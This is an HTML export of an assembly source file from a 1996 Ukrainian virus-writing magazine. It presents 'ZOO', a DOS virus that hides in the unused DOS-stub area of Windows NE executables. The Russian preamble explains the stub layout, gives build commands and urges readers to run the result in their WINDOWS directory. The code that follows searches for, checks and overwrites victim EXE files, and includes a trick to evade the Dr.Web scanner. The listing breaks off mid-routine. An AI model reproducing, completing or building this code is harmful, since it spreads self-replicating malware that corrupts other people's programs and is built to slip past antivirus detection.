<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">COMMENT</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0">
      ▄▄                  █
     ▀▀▀  </span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc5">Magazine</span><span class="sc0">  █ </span><span class="sc5">Box</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Kiev</span><span class="sc0"> </span><span class="sc2">148</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ukraine</span><span class="sc0">       </span><span class="sc5">IV</span><span class="sc0">   </span><span class="sc2">1996</span><span class="sc0">
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ █▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ █ █ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄█ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          </span><span class="sc4">(</span><span class="sc10">C</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">Copyright</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1994</span><span class="sc4">-</span><span class="sc2">96</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0"> </span><span class="sc9">group</span><span class="sc0"> </span><span class="sc5">WorldWide</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">unLtd.</span><span class="sc0">


               Рад приветствовать тебя еще раз</span><span class="sc4">,</span><span class="sc0"> уважаемый читатель!
 Как</span><span class="sc4">-</span><span class="sc0">то на прошлой неделе сидел я в ДОС</span><span class="sc4">-</span><span class="sc0">сессии в ср</span><span class="sc5">@</span><span class="sc0">#ом каталоге
 гнусного ВиН</span><span class="sc5">d0Yz</span><span class="sc4">,</span><span class="sc0"> курил и</span><span class="sc4">,</span><span class="sc0"> следуя своим извращенческим привычкам</span><span class="sc4">,</span><span class="sc0">
 решил </span><span class="sc5">F3</span><span class="sc0"> на </span><span class="sc5">exe</span><span class="sc0">шниках понажимать</span><span class="sc5">.</span><span class="sc0"> Нажал на первом </span><span class="sc4">-</span><span class="sc0"> чуть не
 офигел</span><span class="sc5">.</span><span class="sc0"> Нажал на втором</span><span class="sc4">,</span><span class="sc0"> потом на третьем</span><span class="sc5">...</span><span class="sc0"> </span><span class="sc4">:-[</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0"> Нет</span><span class="sc4">,</span><span class="sc0"> не
 гнусный вирус робко прятал тело свое маленькое в этих </span><span class="sc5">exe</span><span class="sc0">шниках</span><span class="sc4">,</span><span class="sc0">
 а возмутила меня расточительность компании М</span><span class="sc5">i</span><span class="sc0">К┌О</span><span class="sc5">$0</span><span class="sc0">ф┼ </span><span class="sc4">-</span><span class="sc0"> на ассемб</span><span class="sc4">-</span><span class="sc0">
 лерную программу</span><span class="sc4">,</span><span class="sc0"> выдающую на экран строку </span><span class="sc13">'This program requires
</span><span class="sc0"> </span><span class="sc5">Microsoft</span><span class="sc0"> </span><span class="sc5">Windows.</span><span class="sc13">', эти сволочи потратили не 90 байт (в EXE-формате),
</span><span class="sc0"> а целый </span><span class="sc2">1</span><span class="sc0"> К!
      В дальнейшем рассматривая </span><span class="sc9">NE</span><span class="sc0">шки </span><span class="sc4">(</span><span class="sc0">в смысле </span><span class="sc5">New</span><span class="sc0"> </span><span class="sc5">Executable</span><span class="sc4">),</span><span class="sc0"> я
 обнаружил</span><span class="sc4">,</span><span class="sc0"> что компиляторы фирмы </span><span class="sc5">Borland</span><span class="sc0"> такой дырки не оставляют</span><span class="sc5">.</span><span class="sc0">
 Я</span><span class="sc4">,</span><span class="sc0"> соответственно</span><span class="sc4">,</span><span class="sc0"> тут же решил попробовать пожить в этом килобайте
 </span><span class="sc4">(</span><span class="sc0">зачем нашару столько места пропадает</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;-) Что из этого получилось -</span><span class="sc0">
 смотрите ниже</span><span class="sc5">.</span><span class="sc0"> Для начала немного пройдемся по этому </span><span class="sc3">"левому"</span><span class="sc0">
 килобайту</span><span class="sc5">.</span><span class="sc0"> Для винды из всего килобайта важны только три условия</span><span class="sc4">:</span><span class="sc0">
 по смещению </span><span class="sc2">400h</span><span class="sc0"> должен стоять заголовок виндовой проги</span><span class="sc4">,</span><span class="sc0"> а именно
 </span><span class="sc12">'NE'</span><span class="sc4">,</span><span class="sc0"> в начале проги по смещению </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc0"> и по смещению </span><span class="sc2">3bh</span><span class="sc0"> пять
 байт </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h.</span><span class="sc0"> Нафига они там нужны я так и не
 понял</span><span class="sc4">,</span><span class="sc0"> но без них винда считает</span><span class="sc4">,</span><span class="sc0"> что </span><span class="sc5">exe</span><span class="sc0">шник является ДОС</span><span class="sc4">-</span><span class="sc0">приложе</span><span class="sc4">-</span><span class="sc0">
 нием</span><span class="sc5">.</span><span class="sc0"> Повторюсь</span><span class="sc4">,</span><span class="sc0"> это не правило</span><span class="sc4">,</span><span class="sc0"> эта фигня присутствует только
 в </span><span class="sc5">exe</span><span class="sc0">шниках</span><span class="sc4">,</span><span class="sc0"> имеющих </span><span class="sc12">'NE'</span><span class="sc0"> по смещению </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">во всяком случае
 других вариантов дос</span><span class="sc4">-</span><span class="sc0">программы с </span><span class="sc12">'NE'</span><span class="sc0"> по </span><span class="sc2">400h</span><span class="sc0"> я не нашел</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
 Вот</span><span class="sc4">,</span><span class="sc0"> собственно</span><span class="sc4">,</span><span class="sc0"> дизассемблированный участок этой самой
 дос</span><span class="sc4">-</span><span class="sc0">программы</span><span class="sc5">.</span><span class="sc0"> Места</span><span class="sc4">,</span><span class="sc0"> не несущие смысловой нагрузки</span><span class="sc4">,</span><span class="sc0"> я
 оттуда выкинул</span><span class="sc5">.</span><span class="sc0">

 </span><span class="sc2">00000000</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; 'M' сигнатура</span><span class="sc0">
 </span><span class="sc2">00000001</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; 'Z' EXE-файла</span><span class="sc0">
 </span><span class="sc5">..................</span><span class="sc0">
 </span><span class="sc2">0000003B</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; это те самые пять байт:</span><span class="sc0">
 </span><span class="sc2">0000003D</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">       </span><span class="sc1">; 00h, 00h, 04h, 00h, 00h</span><span class="sc0">
 </span><span class="sc2">0000003F</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">..................</span><span class="sc0">
 </span><span class="sc2">00000200</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc2">00000256</span><span class="sc0">   </span><span class="sc1">; вызов процедуры, находящейся по смещению 256h</span><span class="sc0">
 со смещения </span><span class="sc2">200h</span><span class="sc4">,</span><span class="sc0"> собственно</span><span class="sc4">,</span><span class="sc0"> и начинается исполнение этой бадяги </span><span class="sc4">:)</span><span class="sc0">
 </span><span class="sc2">00000203</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This program requires Microsoft Windows.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">
 </span><span class="sc2">0000022E</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; к чему здесь 40 штук пробелов, я так и</span><span class="sc0">
                             не понял </span><span class="sc4">:(</span><span class="sc0">
 </span><span class="sc2">00000256</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc2">00000257</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc2">00000258</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; ds теперь = cs</span><span class="sc0">
 </span><span class="sc2">00000259</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0"> </span><span class="sc1">; вывод фразы win</span><span class="sc0">
 </span><span class="sc2">0000025B</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc2">0000025D</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c01h</span><span class="sc0"> </span><span class="sc1">; выход в ДОС с errorlevel = 1</span><span class="sc0">
 </span><span class="sc2">00000260</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">..................</span><span class="sc0">
 </span><span class="sc2">00000400</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; 'N' сигнатура</span><span class="sc0">
 </span><span class="sc2">00000401</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; 'E' Windows New EXE</span><span class="sc0">

 Со смещения </span><span class="sc2">40h</span><span class="sc0"> по </span><span class="sc2">200h</span><span class="sc0"> и с </span><span class="sc2">252h</span><span class="sc0"> по </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> сплошные нули</span><span class="sc5">.</span><span class="sc0">
 Итого</span><span class="sc4">,</span><span class="sc0"> для жизни остается </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> на </span><span class="sc5">EXE</span><span class="sc4">-</span><span class="sc5">header</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc0">
 </span><span class="sc4">(</span><span class="sc0">это на вывод фразы</span><span class="sc4">,</span><span class="sc0"> фразу и выход в ДОС</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">934</span><span class="sc0"> байта</span><span class="sc5">.</span><span class="sc0"> Мне
 хватило </span><span class="sc2">383</span><span class="sc0"> байт</span><span class="sc4">,</span><span class="sc0"> учитывая текстовые фразы в теле и
 неоптимизированный код</span><span class="sc5">.</span><span class="sc0"> Неиспользованым остался </span><span class="sc2">551</span><span class="sc0"> байт </span><span class="sc4">-</span><span class="sc0">
 можно поэму еще засунуть при желании </span><span class="sc1">;-)</span><span class="sc0">
   Теперь немного о том</span><span class="sc4">,</span><span class="sc0"> что же этот </span><span class="sc5">ZOO</span><span class="sc0"> делает</span><span class="sc5">.</span><span class="sc0"> Ищет в текущем
 каталоге </span><span class="sc9">NE</span><span class="sc4">-</span><span class="sc0">файлы и вписывается в дос</span><span class="sc4">-</span><span class="sc0">программу</span><span class="sc5">.</span><span class="sc0"> Затем выдает
 строку про то</span><span class="sc4">,</span><span class="sc0"> как ошибся юзер</span><span class="sc4">,</span><span class="sc0"> запустив сей файл под досом
 </span><span class="sc4">(</span><span class="sc12">'This program...'</span><span class="sc4">)</span><span class="sc0"> и выходит в ДОС</span><span class="sc5">.</span><span class="sc0"> Нужный </span><span class="sc9">NE</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc0"> определяет по
 трем признакам</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> расширение </span><span class="sc5">.exe</span><span class="sc0"> </span><span class="sc1">;) 2) по смещению 400h 'NE'</span><span class="sc0">
 </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> по смещению </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc12">'шS'</span><span class="sc4">,</span><span class="sc0"> то бишь вышеописанный </span><span class="sc5">call.</span><span class="sc0"> Только
 тогда он считает</span><span class="sc4">,</span><span class="sc0"> что попал</span><span class="sc4">,</span><span class="sc0"> куда нужно и совершает
 вышеописанные действия</span><span class="sc5">.</span><span class="sc0"> Естветсвенно</span><span class="sc4">,</span><span class="sc0"> нерезидент </span><span class="sc4">-</span><span class="sc0"> для
 таких целей резидент был бы просто лишним наворотом</span><span class="sc5">.</span><span class="sc0">
 Но можно подключить в </span><span class="sc5">RCE</span><span class="sc0"> механизм заражения сиих
 файлов и тем самым продлевать свое существования и удивлять
 юзера</span><span class="sc4">,</span><span class="sc0"> выскакивая оттуда</span><span class="sc4">,</span><span class="sc0"> где он нас совсем не ожидает</span><span class="sc5">.</span><span class="sc0"> Тем
 более что места предостаточно</span><span class="sc4">,</span><span class="sc0"> и длина программы не увеличи</span><span class="sc4">-</span><span class="sc0">
 вается</span><span class="sc5">.</span><span class="sc0">
   Теперь немного текста для желающих сей </span><span class="sc5">ZOO</span><span class="sc0"> запустить и потестировать
 на своей машине</span><span class="sc5">.</span><span class="sc0">
    Компилить исходник нужно следующим образом</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">TASM.EXE</span><span class="sc0"> </span><span class="sc5">ZOO.ASM</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">M2</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">два прохода</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">TLINK.EXE</span><span class="sc0"> </span><span class="sc5">ZOO.OBJ</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">T</span><span class="sc0">
 Должен получиться </span><span class="sc5">.com</span><span class="sc0"> на </span><span class="sc2">383</span><span class="sc0"> байта</span><span class="sc5">.</span><span class="sc0"> Мувите то</span><span class="sc4">,</span><span class="sc0"> что получилось</span><span class="sc4">,</span><span class="sc0">
 в каталог </span><span class="sc5">WINDOWS</span><span class="sc4">,</span><span class="sc0"> запускаете и наслаждаетесь! </span><span class="sc1">;-) </span><span class="sc0">
\\ </span><span class="sc4">*</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; начинаем поиск жертв</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fmask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@xor</span><span class="sc0">       </span><span class="sc1">; раскриптуем строку '*.exe', 0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">est_eshe_poroh_v_porohovnitsah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">       </span><span class="sc1">; увы, больше exeшников нет</span><span class="sc0">
</span><span class="sc5">est_eshe_poroh_v_porohovnitsah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">obmanem_etu_sranuyu_windu</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; следующие три строки - те самые пять байт</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; 00h, 00h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; 04h, 00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; 00h</span><span class="sc0">
</span><span class="sc5">obmanem_etu_sranuyu_windu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fmask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@xor</span><span class="sc0">       </span><span class="sc1">; закриптуем маску обратно</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">savtim</span><span class="sc0">     </span><span class="sc1">; дату/время сохраним</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">9ah</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virlen</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">findnext</span><span class="sc0">    </span><span class="sc1">; какой же NE-exe будет меньше длины виря?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open</span><span class="sc0">       </span><span class="sc1">; открываем на чтение</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">findnext</span><span class="sc0">     </span><span class="sc1">; ошибки... :(</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; хэндл файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fopen_via_sft</span><span class="sc0"> </span><span class="sc1">; а вот теперь открываем на запись :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">       </span><span class="sc1">; указатель на 400h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">slovo</span><span class="sc4">],</span><span class="sc12">'EN'</span><span class="sc0"> </span><span class="sc1">; Это NE-exe?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; увы, нет</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">slovo</span><span class="sc4">],</span><span class="sc12">'Sш'</span><span class="sc0"> </span><span class="sc1">; а точно это NE-exe?</span><span class="sc0">
        </span><span class="sc1">; 'шS' в девственном NE-exe есть код call'а на вывод фразы</span><span class="sc0">
        </span><span class="sc1">; 'This...' и выход в ДОС</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">slovo</span><span class="sc4">],</span><span class="sc2">04eb4h</span><span class="sc0"> </span><span class="sc1">; а может мы тут уже были?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; ну раз не было еще нас здесь, тогда будем</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0"> </span><span class="sc1">; организуем новый заголовок EXE-файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; ну и запишемся сами</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">resttim</span><span class="sc0">    </span><span class="sc1">; время восстановим</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@close</span><span class="sc0">     </span><span class="sc1">; ну и файлик закроем</span><span class="sc0">
</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; и опять - к следующей жертве</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">

</span><span class="sc1">;;;;;; а это пошли процедурины</span><span class="sc0">

</span><span class="sc5">fopen_via_sft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc1">; это прикол для wEb'А - чтобы он не кричал EXE.Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@web_idiot</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@web_idiot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">@@xor</span><span class="sc4">:</span><span class="sc0">
